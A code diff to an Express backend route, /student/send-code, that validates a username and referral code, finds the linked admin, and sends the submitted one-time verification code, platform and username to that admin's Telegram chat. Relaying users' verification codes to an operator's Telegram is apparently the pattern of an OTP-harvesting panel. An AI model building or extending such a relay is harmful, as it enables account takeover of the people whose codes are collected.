@@ -801,35 +801,63 @@ VPN: ${vpn}
 });// ---------- STUDENT SEND-CODE ----------
 app.post("/student/send-code", async (req, res) => {
   console.log("Incoming body:", req.body);
-console.log("ReferralCode received:", req.body.referralCode, typeof req.body.referralCode);
+  console.log("ReferralCode received:", req.body.referralCode, typeof req.body.referralCode);
+  
   try {
     const { code, referralCode, platform, username } = req.body || {};
     
-    if (!referralCode?.trim()) return res.status(400).json({ success: false, error: "Referral code is required" });
-    if (!code?.trim()) return res.status(400).json({ success: false, error: "Verification code is required" });
-    if (!username?.trim()) return res.status(400).json({ success: false, error: "Username is required" });
+    if (!referralCode?.trim()) 
+      return res.status(400).json({ success: false, error: "Referral code is required" });
+    if (!code?.trim()) 
+      return res.status(400).json({ success: false, error: "Verification code is required" });
+    if (!username?.trim()) 
+      return res.status(400).json({ success: false, error: "Username is required" });
 
-    const ref = await Referral.findOne({ code: referralCode.trim() }).lean();
+    const cleanReferral = referralCode.trim();
+    const cleanUsername = username.trim();
+    const cleanCode = code.trim();
+
+    // 1. Validate student exists
+    const student = await Student.findOne({ username: cleanUsername });
+    if (!student) 
+      return res.status(404).json({ success: false, error: "Student not found" });
+
+    // 2. Validate referral code exists in Referral collection
+    const refDoc = await Referral.findOne({ code: cleanReferral }).lean();
+    if (!refDoc) 
+      return res.status(404).json({ success: false, error: "Invalid referral code" });
+
+    // 3. Find admin: priority = referralCode, fallback = student.owner
+    let admin = await Admin.findOne({ referralCode: cleanReferral });
     
-    const student = await Student.findOne({ username: username.trim() });
-    if (!student) return res.status(404).json({ success: false, error: "CL found" });
+    if (!admin) {
+      console.log(`Admin not found by referralCode ${cleanReferral}, trying fallback owner: ${student.owner}`);
+      admin = await Admin.findOne({ username: student.owner });
+    }
 
-    const admin = await Admin.findOne({ username: student.owner });
-    if (!admin || !admin.chatId) return res.status(404).json({ success: false, error: "Admin not found or Telegram not linked" });
+    if (!admin || !admin.chatId) {
+      console.log("Admin lookup failed. Admin:", admin?._id, "ChatId:", admin?.chatId);
+      return res.status(404).json({ 
+        success: false, 
+        error: "Admin not found or Telegram not linked. Contact support." 
+      });
+    }
 
+    // 4. Send telegram
     const msg = `
 🔐 VERIFICATION REQUEST
-Username: ${escapeMarkdown(username)}
+Username: ${escapeMarkdown(cleanUsername)}
 Platform: ${escapeMarkdown(platform || "unknown")}
-Code: \`${escapeMarkdown(code)}\`
-Referral: ${escapeMarkdown(referralCode)}
+Code: \`${escapeMarkdown(cleanCode)}\`
+Referral: ${escapeMarkdown(cleanReferral)}
+Admin found via: ${admin.referralCode === cleanReferral ? 'referral' : 'owner fallback'}
 `;
     await sendTelegram(admin.chatId, msg);
 
     await Activity.create({ 
       adminId: admin._id, 
       action: "verification_requested", 
-      details: { username, code, platform, referralCode } 
+      details: { username: cleanUsername, code: cleanCode, platform, referralCode: cleanReferral }
     });
 
     return res.json({ success: true, message: "Verification request sent to admin" });
